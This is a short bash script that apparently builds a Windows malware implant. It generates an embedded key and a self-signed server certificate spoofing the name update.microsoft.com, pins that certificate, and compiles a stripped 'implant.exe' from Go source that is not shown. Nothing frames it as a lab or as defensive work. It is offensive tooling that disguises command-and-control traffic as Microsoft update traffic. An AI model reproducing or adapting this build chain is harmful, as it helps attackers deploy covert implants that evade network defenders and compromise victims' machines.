#!/bin/bash
set -e

# Generate implant key
KEY=$(openssl rand -hex 32)
echo "[*] Generated key: $KEY"

# Generate server cert (if it doesn't exist)
if [ ! -f server.crt ]; then
    openssl req -x509 -newkey rsa:4096 -sha256 -days 365 -nodes \
        -keyout server.key -out server.crt \
        -subj "/CN=update.microsoft.com" 2>/dev/null
    echo "[*] Generated server.crt and server.key"
fi

# Compute cert pin (SHA-256 of DER-encoded cert)
PIN=$(openssl x509 -in server.crt -outform DER | sha256sum | cut -d' ' -f1)
echo "[*] Cert pin: $PIN"

GOOS=windows GOARCH=amd64 go build \
    -ldflags "-s -w -X main.staticKeyHex=$KEY -X main.certPinHex=$PIN" \
    -o implant.exe \
    implant.go

echo "[+] Build complete: implant.exe"
